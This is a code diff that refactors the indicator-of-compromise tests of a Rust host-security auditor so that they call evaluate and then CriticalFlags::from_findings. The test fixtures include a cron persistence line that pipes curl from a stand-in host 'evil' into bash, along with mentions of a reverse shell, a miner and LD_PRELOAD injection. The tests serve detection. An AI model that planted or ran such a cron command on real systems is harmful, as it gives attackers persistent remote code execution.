@@ -2805,7 +2805,8 @@ pub(crate) fn classify_setuid(
 }
 
 // ── Tests ─────────────────────────────────────────────────
-
+// R25-53(e): IoC tests now go through evaluate + CriticalFlags::from_findings,
+// matching the production path (evaluate -> from_findings -> verdict_from_findings).
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -3348,7 +3349,8 @@ mod tests {
         use crate::models::SuspiciousProcess;
 
         let clean = minimal_report();
-        let cf = CriticalFlags::from_report(&clean);
+        let findings = evaluate(&clean);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(!cf.compromised_host);
         assert!(!cf.is_compromised());
 
@@ -3359,13 +3361,15 @@ mod tests {
             exe_path: Some("/tmp/xmrig".into()),
             ..Default::default()
         }];
-        let cf = CriticalFlags::from_report(&r);
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(cf.compromised_host, "SEC-016 must set compromised_host");
         assert!(cf.is_compromised());
 
         let mut r = minimal_report();
         r.network.firewall_active = false;
-        let cf = CriticalFlags::from_report(&r);
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(cf.has_critical(), "SEC-001 is a standard critical");
         assert!(
             !cf.compromised_host,
@@ -3378,11 +3382,9 @@ mod tests {
             command: "* * * * * root curl http://evil | bash -c".into(),
             severity: CronSeverity::Critical,
         }];
-        let cf = CriticalFlags::from_report(&r);
-        assert!(
-            evaluate(&r).iter().any(|f| f.id == "SEC-018"),
-            "SEC-018 fires"
-        );
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(findings.iter().any(|f| f.id == "SEC-018"), "SEC-018 fires");
         assert!(
             !cf.compromised_host,
             "cron persistence is not an active compromise"
@@ -3406,10 +3408,10 @@ mod tests {
             .expect("SEC-020 fires");
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("kworker/0:1") && f.evidence.contains("/tmp/kdevtmpfsi"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "mimic must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "mimic must set compromise");
     }
 
     #[test]
@@ -3428,10 +3430,10 @@ mod tests {
             .expect("SEC-021 fires");
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("/proc/1337"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "mount masking must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "mount masking must set compromise");
     }
 
     #[test]
@@ -3452,10 +3454,10 @@ mod tests {
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("203.0.113.5:443"));
         assert!(f.evidence.contains("stdout"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "reverse shell must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "reverse shell must set compromise");
     }
 
     #[test]
@@ -3479,10 +3481,10 @@ mod tests {
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("/tmp/hide.so"));
         assert!(f.evidence.contains("LD_PRELOAD"));
-        assert!(
-            CriticalFlags::from_report(&r).compromised_host,
-            "library injection must set compromise"
-        );
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
+        assert!(cf.compromised_host, "library injection must set compromise");
     }
 
     #[test]
@@ -3504,8 +3506,11 @@ mod tests {
         assert_eq!(f.weight, 60);
         assert!(f.evidence.contains("31337"));
         assert!(f.evidence.contains("holds socket"));
+
+        let findings = evaluate(&r);
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(
-            CriticalFlags::from_report(&r).compromised_host,
+            cf.compromised_host,
             "confirmed ghost PID must set compromise"
         );
     }
@@ -3522,16 +3527,18 @@ mod tests {
             confirmed_ioc: false,
             holds_socket: false,
         }];
+        let findings = evaluate(&r);
         assert!(
-            evaluate(&r).iter().any(|f| f.id == "SEC-025"),
+            findings.iter().any(|f| f.id == "SEC-025"),
             "SEC-025 downgraded finding fires"
         );
         assert!(
-            !evaluate(&r).iter().any(|f| f.id == "SEC-024"),
+            !findings.iter().any(|f| f.id == "SEC-024"),
             "no hard SEC-024 for a young candidate"
         );
+        let cf = CriticalFlags::from_findings(&findings);
         assert!(
-            !CriticalFlags::from_report(&r).compromised_host,
+            !cf.compromised_host,
             "downgraded ghost must not set compromise"
         );
     }
